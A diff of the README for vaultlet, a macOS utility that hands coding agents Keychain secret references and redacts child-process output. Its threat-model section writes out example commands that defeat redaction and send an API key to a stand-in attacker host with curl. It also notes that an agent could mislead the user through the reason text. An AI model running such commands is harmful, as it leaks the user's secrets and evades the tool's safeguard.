@@ -1,54 +1,60 @@
 # vaultlet
 
-A small personal secrets utility for macOS. It stores secrets in the macOS
-Keychain and hands agents **pointers** (`vaultlet://group/key`), never
-values. There is no command or MCP tool anywhere in vaultlet that prints or
-returns a secret value — that absence is the whole design.
+Keep API keys out of your coding agent's transcript. vaultlet stores secrets in
+the macOS Keychain and gives agents references (`vaultlet://stripe/API_KEY`)
+instead of values. The value is only ever injected into the environment of a
+child process, and that process's output is scrubbed before the agent sees it.
 
-Zero third-party dependencies in the package itself (stdlib only). The MCP
-server is the one exception, and it's run via `uv run --with mcp` so nothing
-gets installed into the repo.
+## The agent workflow
 
-## Why
+1. The agent calls `list_keys` / `has_secret` over MCP and sees only refs.
+2. If a secret is missing, it calls `request_secret(group, key, reason)`. A
+   local page opens in your browser; you type the value there. The tool
+   returns the ref, not the value. Nothing is pasted into chat.
+3. To use it, the agent runs the real command through vaultlet:
 
-Agents routinely need API keys, but the easiest way to hand one over — paste
-it into chat, or `echo $KEY` so the agent can read it — puts the secret in
-the transcript forever. vaultlet gives the agent a ref it can pass around
-instead, and only ever injects the real value into the environment of a
-child process it spawns to consume it, with that child's output redacted
-before it's printed.
+   ```sh
+   vaultlet run --ref vaultlet://stripe/API_KEY -- sh -c 'curl -s https://api.stripe.com/v1/balance -u "$API_KEY:"'
+   vaultlet run --group stripe -- ./deploy.sh
+   ```
 
-## Install / setup
+   The value goes into the child's environment. The child's stdout and stderr
+   are streamed back with every injected value, and its base64 and
+   URL-encoded forms, replaced by `«redacted:stripe/API_KEY»`.
 
-```
-git clone <this repo> ~/dev/vaultlet
-```
+There is no MCP tool and no CLI command that prints a value. That is the
+design; see [Threat model](#threat-model) for what it does and does not buy you.
 
-Put `bin/vaultlet` on your `PATH`, e.g. add to your shell profile:
+## Install
+
+Requires macOS and Python 3 (tested on 3.12). The CLI uses only the standard
+library. The MCP server needs `mcp` 1.x, run through `uv` so nothing is
+installed into your environment.
 
 ```sh
-export PATH="$HOME/dev/vaultlet/bin:$PATH"
+git clone https://github.com/anhermon/vaultlet ~/src/vaultlet
+ln -s ~/src/vaultlet/bin/vaultlet /usr/local/bin/vaultlet   # or add bin/ to PATH
+brew install uv                                              # for the MCP server
 ```
 
-or symlink it into a directory already on `PATH`:
+## Quickstart
 
 ```sh
-ln -s ~/dev/vaultlet/bin/vaultlet /usr/local/bin/vaultlet
+vaultlet ui                       # open the local page, create a group, add keys
+vaultlet groups
+vaultlet keys stripe              # key names and refs, no values
+vaultlet run --group stripe -- sh -c 'echo "key length: ${#API_KEY}"'
 ```
 
-Requires `uv` for the MCP server (`brew install uv`).
+## MCP setup (Claude Code)
 
-### Register the MCP server with Claude Code
-
-```
+```sh
 claude mcp add vaultlet --scope user -- \
-  uv run --directory ~/dev/vaultlet --with mcp python -m vaultlet.mcp_server
+  uv run --directory /absolute/path/to/vaultlet --with "mcp==1.29.0" \
+  python -m vaultlet.mcp_server
 ```
 
-`--directory` makes it cwd-independent, which matters because the MCP server is
-launched from whatever project you're in, not from the repo. `--scope user`
-registers it for every project — match this to the skill, which is also
-user-scope. Equivalent `.mcp.json` entry:
+Equivalent `.mcp.json`:
 
 ```json
 {
@@ -56,71 +62,103 @@ user-scope. Equivalent `.mcp.json` entry:
     "vaultlet": {
       "command": "uv",
       "args": ["run", "--directory", "/absolute/path/to/vaultlet",
-               "--with", "mcp", "python", "-m", "vaultlet.mcp_server"]
+               "--with", "mcp==1.29.0", "python", "-m", "vaultlet.mcp_server"]
     }
   }
 }
 ```
 
-A companion Claude Code skill (`~/.claude/skills/vaultlet-secret/SKILL.md`)
-tells agents when and how to use it.
+`mcp` is pinned to 1.x because 2.0 removed `mcp.server.fastmcp`, which the
+server uses. Tools: `list_groups`, `list_keys`, `has_secret`,
+`request_secret`, `usage_hint`. All return names or refs, never values.
 
 ## CLI
 
 ```
-vaultlet groups                                    # list group names
-vaultlet keys <group>                               # key + ref, no values
-vaultlet ui [--port N]                              # start the management UI
-vaultlet request <group> <key> [--reason TEXT]      # open UI, block until set
+vaultlet groups
+vaultlet keys <group>
+vaultlet ui [--port N]
+vaultlet request <group> <key> [--reason TEXT]
 vaultlet run [--group G]... [--ref vaultlet://g/k[=ENVNAME]]... -- <cmd> [args...]
 ```
 
-`run` injects resolved secrets into the child process's environment (never
-this process's own env) and streams the child's merged stdout/stderr back
-through a redaction filter that replaces every injected value — plus its
-base64 and URL-quoted forms — with `«redacted:group/key»` before printing.
+`--group G` injects every key in G under its own name. `--ref` injects one key,
+optionally under another env var name. `run` exits with the child's exit code.
+`run` does not expand `$VARS` itself; wrap in `sh -c` if the command line needs
+them. Group names match `[A-Za-z0-9_.-]+`; key names must be valid env var names.
 
-## MCP tools
+## How it works
 
-| Tool | Returns |
-|---|---|
-| `list_groups()` | group names |
-| `list_keys(group)` | `[{"key", "ref"}]` |
-| `has_secret(group, key)` | bool |
-| `request_secret(group, key, reason)` | ref (opens UI, blocks up to 300s) |
-| `usage_hint()` | short string explaining the ref-only model |
-
-No tool returns a value. No get/read/reveal/resolve tool exists, deliberately.
-
-## The ref model
-
-A secret lives in the Keychain under service `vaultlet:<group>`, account
-`<key>`. Everything else — the CLI, the UI, the MCP server, an agent — deals
-only in the string `vaultlet://<group>/<key>`. The only code path that ever
-reads a value out of the Keychain is `vaultlet run`, and the value goes
-straight into a child process's env, never back out to this process's
-stdout except through the redaction filter.
+Values live in the Keychain: service `vaultlet:<group>`, account `<key>`. An
+index of group and key names (no values) is kept in `~/.vaultlet/index.json`,
+mode 0600. Writes pass the value to `security -i` on stdin, so it does not
+appear in `ps`. The management page binds to 127.0.0.1 only, rejects requests
+with a foreign `Host` or `Origin`, and its API never returns a value. Only
+`vaultlet run` reads values back.
 
 ## Threat model
 
-This is **defense-in-depth against a secret accidentally ending up in an
-agent's transcript or output** — not a sandbox against a determined agent.
-Anyone with shell access on the machine can call `security
-find-generic-password` directly and read any secret vaultlet stores; vaultlet
-doesn't (and can't) stop that. What it does is remove the *easy, accidental*
-path: an agent that only ever sees refs has to go out of its way to get a
-raw value, instead of it showing up in a chat log by default.
+vaultlet protects against a secret *accidentally* landing in an agent
+transcript, shell history, or log. It is not a sandbox against an agent that
+wants the value.
 
-Known ceilings, stated plainly rather than hidden:
+- Anything running as your user can read the Keychain item with
+  `security find-generic-password -w`. vaultlet adds no barrier there.
+- The agent chooses the command that `vaultlet run` executes. A command such as
+  `sh -c 'echo $API_KEY | rev'` defeats redaction, and
+  `curl https://attacker.example -d "$API_KEY"` sends the value off-machine.
+  Review what the agent runs, or gate `vaultlet run` behind your agent's
+  permission prompts.
+- The child process can read its own environment, and so can anything else
+  running as you that can inspect it.
+- Redaction is line-based. A value split across lines, or in a stream that never
+  emits a newline, can pass through. Encodings other than raw, base64 and
+  URL-quoted are not caught.
+- Values shorter than 4 characters are not redacted (a warning is printed).
+- Values cannot contain newlines.
+- `request_secret` shows the agent-supplied `reason` text on the page. It is
+  escaped, but a misleading reason can still talk you into entering a secret
+  you should not. Read it.
+- macOS only. There is no Linux or Windows backend.
 
-- **Brief `ps` visibility.** Values are passed to the `security` CLI as an
-  argv element, so they're briefly visible in `ps` output of that child
-  process while it runs (argv is world-readable on most systems).
-- **Line-buffered redaction.** `vaultlet run`'s output filter reads and
-  redacts line by line. A secret value split across a line boundary, or
-  written without a trailing newline right at a read-chunk edge, can slip
-  through unredacted.
+See [SECURITY-REVIEW.md](SECURITY-REVIEW.md) for the review notes.
 
-Both are accepted trade-offs for a personal utility, not oversights — see
-the `ponytail:` comments at the corresponding lines in `store.py` and
-`cli.py` for the exact spot and the upgrade path if either ever matters.
+## How it differs, and when not to use it
+
+- **envchain** stores secrets in the Keychain and injects them into a command's
+  environment. That is vaultlet's `run`, minus refs, the MCP server, the entry
+  page and output redaction. If you only want Keychain-to-env, use envchain.
+- **1Password CLI (`op run`)** resolves `op://` references into a child's
+  environment and can mask secrets in output. This is the closest design, and
+  it is more mature, cross-platform, and supports teams, biometric unlock and
+  rotation. If you already use 1Password, use it. vaultlet's difference is the
+  agent-facing piece: MCP tools and a browser form so an agent can ask for a
+  secret without seeing it.
+- **Infisical, Doppler, HashiCorp Vault**: hosted or self-hosted secret
+  managers with access control, audit logs, rotation and team sharing. Use these
+  for anything shared or production. vaultlet is a single-user local store.
+- **sops / age**: encrypted secret files you commit alongside code. A different
+  problem (secrets in version control, for people and CI), and the decrypted
+  value still reaches whatever reads the file.
+- **direnv**: loads environment variables per directory. It has no secret
+  storage and no redaction; the values end up in your shell.
+- **Agent-specific tools**: several MCP servers and agent plugins expose secret
+  managers to agents. I have not surveyed them exhaustively. Any that return
+  values to the model put the value in the transcript, which is the case
+  vaultlet exists to avoid.
+
+Do not use vaultlet if you need Linux or Windows, team sharing, audit logging,
+rotation, a hardened boundary against a hostile agent, or production secrets.
+
+## Development
+
+```sh
+python3 -m unittest -v test_vaultlet
+```
+
+The Keychain round-trip test writes and deletes an item named
+`vaultlet:vaultlet-test-integration`. Set `VAULTLET_SKIP_KEYCHAIN=1` to skip it.
+
+## License
+
+MIT. See [LICENSE](LICENSE).
